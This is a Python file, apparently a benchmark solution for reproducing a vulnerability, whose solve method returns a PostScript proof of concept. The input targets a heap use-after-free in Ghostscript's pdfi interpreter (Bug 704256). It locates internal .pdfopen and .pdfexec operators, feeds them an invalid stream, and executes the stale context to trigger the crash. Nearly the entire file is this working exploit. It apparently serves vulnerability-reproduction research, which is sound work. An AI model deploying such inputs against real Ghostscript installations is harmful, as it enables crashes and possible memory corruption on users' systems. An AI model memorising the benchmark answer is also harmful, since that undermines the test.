import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (arvo:42280 / Ghostscript Bug 704256) is a Heap Use-After-Free in pdfi.
        It occurs when a pdfi context is created, but setting the input stream fails (e.g. invalid PDF).
        The context is not properly cleaned up or validated, and subsequent usage of this context 
        (specifically the NULL stream pointer) by other operators like .pdfexec triggers the crash.
        """
        
        # We construct a PostScript file that:
        # 1. Locates the internal pdfi operators (.pdfopen, .pdfexec).
        # 2. Creates a file stream containing invalid PDF data.
        # 3. Attempts to open this stream as a PDF context using .pdfopen.
        #    This is expected to fail stream validation, but potentially leave the context in the provided dictionary.
        # 4. Iterates through the dictionary to find the context object.
        # 5. Calls .pdfexec on the context, triggering the Use-After-Free on the uninitialized/NULL stream.
        
        return b"""%!PS
/find_op {
  % Check if name exists in where stack (userdict/systemdict)
  dup where { exch get } {
    % Check internaldict (1183615869)
    pop 1183615869 internaldict exch
    2 copy known { get } { pop pop null } ifelse
  } ifelse
} bind def

% Potential names for the operators depending on build configuration
/open_names [/.pdfopen /pdfopen /.pdfiopen /pdfiopen] def
/exec_names [/.pdfexec /pdfexec /.pdfiexec /pdfiexec] def

/get_op {
  % Iterate names until an operator is found
  { find_op dup null ne { exit } { pop } ifelse } forall
} bind def

/run_exploit {
  open_names get_op /op_open exch def
  exec_names get_op /op_exec exch def
  
  % Only proceed if operators are found
  op_open null ne op_exec null ne and {
    /ctx_dict 10 dict def
    
    % Create a stream with invalid PDF data (invalid header)
    (INVALID_PDF_CONTENT) (r) file 
    ctx_dict
    
    % Call .pdfopen inside stopped to handle the expected error
    % .pdfopen(stream, dict)
    { op_open exec } stopped pop
    
    % Check if context was deposited in dict despite failure
    ctx_dict {
      exch pop % discard key
      % Value is on stack (potential context)
      
      % Attempt to execute context. This triggers access to ctx->stream which is NULL/invalid
      { op_exec exec } stopped pop
    } forall
  } if
} def

run_exploit
quit
"""
